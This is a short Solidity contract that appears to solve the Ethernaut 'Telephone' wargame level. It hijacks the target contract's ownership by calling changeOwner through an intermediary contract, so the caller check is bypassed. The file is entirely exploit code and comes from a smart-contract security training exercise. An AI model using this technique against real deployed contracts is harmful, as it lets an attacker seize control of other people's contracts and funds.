pragma solidity ^0.4.18;

import "levels/Telephone.sol";

contract TelephoneHack {
    function attack(address _target, address _newOwner) public {
        Telephone(_target).changeOwner(_newOwner);
    }
}